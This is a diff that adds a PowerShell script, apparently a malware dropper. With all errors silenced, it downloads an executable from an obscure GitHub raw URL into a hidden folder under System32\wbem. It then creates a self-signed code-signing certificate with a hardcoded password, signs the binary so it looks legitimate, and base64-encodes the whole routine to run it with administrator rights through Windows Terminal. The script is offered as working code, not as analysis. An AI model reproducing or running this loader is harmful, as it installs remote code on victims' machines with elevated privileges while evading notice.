@@ -1,0 +1,30 @@
+$code = @'
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+
+try {
+    New-Item -ItemType Directory -Path "C:\Windows\System32\wbem\sys" -Force -ErrorAction SilentlyContinue | Out-Null
+
+    Invoke-WebRequest `
+      -Uri "https://github.com/v8kg/FWJ9AJFWA9J9JFA9JF9JFW9JFA9JFWA9JFWA9JFWA9FWA9JFWA9JFWA9JFWA9J9JFWAFWA9J9JFWA9JFWA9JFWAFWA9JFWA/raw/refs/heads/main/sys.exe" `
+      -OutFile "C:\Windows\System32\wbem\sys\sys.exe" `
+      -ErrorAction SilentlyContinue | Out-Null
+
+    winget install --id Microsoft.WindowsSDK.10.0.26100 --exact *> $null
+
+    $folder = "C:\Certificates"
+    $password = ConvertTo-SecureString "JRKRK" -AsPlainText -Force
+    New-Item -ItemType Directory -Path $folder -Force -ErrorAction SilentlyContinue | Out-Null
+
+    $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=JJ" -CertStoreLocation "Cert:\CurrentUser\My" -ErrorAction SilentlyContinue
+    Export-PfxCertificate -Cert $cert -FilePath "$folder\JJ.pfx" -Password $password -ErrorAction SilentlyContinue | Out-Null
+
+    & "${env:ProgramFiles(x86)}\Windows Kits\10\bin\10.0.28000.0\x64\signtool.exe" sign /fd SHA256 /f "$folder\JJ.pfx" /p "JRKRK" "C:\Windows\System32\wbem\sys\sys.exe" *> $null
+} catch {}
+'@
+
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
+
+Start-Process "C:\Users\sylicism\AppData\Local\Microsoft\WindowsApps\wt.exe" `
+  -Verb RunAs `
+  -ArgumentList "new-tab powershell.exe -NoExit -EncodedCommand $encoded"
